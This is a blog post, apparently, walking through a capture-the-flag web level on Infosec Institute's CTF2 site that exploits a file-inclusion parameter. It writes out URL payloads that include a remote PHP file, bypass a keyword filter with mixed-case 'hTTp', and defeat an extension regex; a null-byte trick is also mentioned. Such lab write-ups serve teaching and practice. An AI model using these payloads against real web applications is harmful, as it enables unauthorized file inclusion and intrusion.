---
layout: post
title: Infosec Institute CTF2 Practical Web Hacking Level 4
category: Web
tags: infosec
---

**Vulnerability** A4 Insecure Direct Object References
**Description:**

![screen]({{site.url}}/assets/Screen Shot 2015-07-17 at 1.42.57 AM.png)

## Write-up

For almost all levels I will be using Burpsuite. Burpsuite is an interception proxy that lets us modify the HTTP request
 / response by intercepting the data between the browser and the web server.
 
This time we are presented with a web page that has 3 links, 'Bio', 'Clients' and 'About'. Each link embeds a text file into
the page, 'file1.txt', 'file2.txt' and 'file3.txt' respectively. The url parameter is 'file' with one of the txt filenames as
argument.

{% highlight text  %}
http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=file1.txt
http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=file2.txt
http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=file3.txt
{% endhighlight %}

Lets try substituting the inserted text file with an php file located in http://infosecinstitute.com by using the
following url

{% highlight text %}
http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=http://infosecinstitute.com/index.php
{% endhighlight %}

Unfortunately, we hit a filter.

![screen1]({{site.url}}/assets/Screen Shot 2015-07-17 at 2.00.10 AM.png)

We can bypass it by using some capital characters in the 'http' keyword like so

{% highlight text %}
http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=hTTp://infosecinstitute.com/index.php
{% endhighlight %}

It looks like the filter was not case-insensitive and we were able to bypass it however,
now it doesn't like the file extension.

![screen2]({{site.url}}/assets/Screen Shot 2015-07-17 at 2.04.32 AM.png)

One trick to circumvent this is to insert a null byte (%00 url encoded), but this time it did not work.
After some trial and error I saw the second Hint stating that there's a regular-expression restriction,
so I changed the filename from index.php to 'file1.txt' with '.php' extension to successfully complete the level.

{% highlight text %}
http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=hTTp://infosecinstitute.com/file1.txt.php
{% endhighlight %}

![screen2]({{site.url}}/assets/Screen Shot 2015-07-17 at 2.13.07 AM.png)

If I have to guess, their regular-expression restriction could be looking for the 3 'permitted' filenames, 'file1.txt',
'file2.txt' and 'file3.txt' when loading a file into the page.

## Links

* <http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php>
